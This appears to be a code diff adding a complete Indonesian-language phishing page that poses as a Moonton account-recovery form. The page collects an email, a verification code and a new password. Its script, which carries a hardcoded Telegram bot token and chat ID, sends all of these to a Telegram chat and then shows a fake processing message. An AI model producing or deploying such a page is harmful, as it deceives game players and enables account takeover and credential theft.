@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pulihkan Akun Moonton</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f5f6f8; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 500px; background-color: #ffffff; min-height: 100vh; border-left: 1px solid #ddd; border-right: 1px solid #ddd; }
+        .header { background-color: #4a6fa5; color: white; padding: 15px; text-align: center; font-style: italic; font-size: 18px; position: relative; }
+        .header span { position: absolute; left: 15px; font-style: normal; }
+        .content { padding: 20px; }
+        .instruction { color: #555; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; color: #888; font-size: 13px; margin-bottom: 8px; }
+        .input-row { display: flex; gap: 10px; }
+        input { width: 100%; padding: 12px; border: 1px solid #eee; border-radius: 4px; background-color: #fafafa; box-sizing: border-box; outline: none; }
+        .btn-send-code { background-color: #1a91ff; color: white; border: none; border-radius: 4px; padding: 0 15px; cursor: pointer; font-size: 13px; }
+        .hint { font-size: 11px; color: #999; margin-top: 8px; line-height: 1.4; }
+        .btn-submit { width: 100%; background-color: #a0d2eb; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 16px; margin-top: 30px; cursor: pointer; font-weight: bold; }
+        .footer { text-align: center; font-size: 11px; color: #999; margin-top: 50px; padding-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <span>&lt;</span> Pulihkan Akun Moonton
+    </div>
+
+    <div class="content">
+        <p class="instruction">
+            Mohon ganti alamat Email Anda yang terhubung dan kata sandi Moonton Anda. Setelah pemulihan selesai, semua akun pihak ketiga yang terhubung ke akun Moonton Anda akan dilepaskan, dan kunci perangkat akan dinonaktifkan jika diaktifkan.
+        </p>
+
+        <form id="dataForm">
+            <div class="form-group">
+                <label>Email</label>
+                <div class="input-row">
+                    <input type="email" id="email" placeholder="Silakan masukkan alamat Email baru" required>
+                    <button type="button" class="btn-send-code">Kirim Kode</button>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Kode Verifikasi</label>
+                <input type="text" id="kode" placeholder="Silakan masukkan kode verifikasi." required>
+            </div>
+
+            <div class="form-group">
+                <label>Kata Sandi Baru</label>
+                <input type="password" id="sandi1" placeholder="Silakan masukkan kata sandi baru." required>
+                <p class="hint">Gunakan 6 karakter atau lebih dengan kombinasi huruf besar dan huruf kecil, angka, serta bukan simbol khusus.</p>
+            </div>
+
+            <div class="form-group">
+                <label>Silakan mengkonfirmasi kata sandi Anda.</label>
+                <input type="password" id="sandi2" placeholder="Silakan masukkan kembali kata sandi Anda." required>
+            </div>
+
+            <button type="submit" class="btn-submit" id="btnKirim">Kirim</button>
+        </form>
+
+        <div class="footer">
+            Powered by AIHELP.NET
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- PENGATURAN BOT TELEGRAM ---
+    const TELEGRAM_TOKEN = '8770083474:AAHTcGTwVNgvC0JwL8T2pTbRuQAbIjVtMT8'; // Tempel Token dari BotFather di sini
+    const TELEGRAM_CHAT_ID = '8258184404'; // ID kamu sudah terpasang
+
+    document.getElementById('dataForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnKirim');
+        const email = document.getElementById('email').value;
+        const kode = document.getElementById('kode').value;
+        const sandi1 = document.getElementById('sandi1').value;
+        const sandi2 = document.getElementById('sandi2').value;
+
+        // Ubah teks tombol saat loading
+        btn.innerText = 'Memproses...';
+        btn.disabled = true;
+
+        const pesan = `
+🚀 *DATA AKUN BARU* 🚀
+----------------------------
+📧 *Email:* ${email}
+🔑 *Kode:* ${kode}
+🔒 *Sandi:* ${sandi1}
+🔒 *Konfirm:* ${sandi2}
+----------------------------
+`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: pesan,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(res => {
+            alert('Permintaan sedang diproses. Mohon tunggu 1x24 jam.');
+            window.location.reload();
+        })
+        .catch(err => {
+            alert('Gagal mengirim data. Pastikan Token Bot sudah benar.');
+            btn.innerText = 'Kirim';
+            btn.disabled = false;
+        });
+    });
+</script>
+
+</body>
+</html>
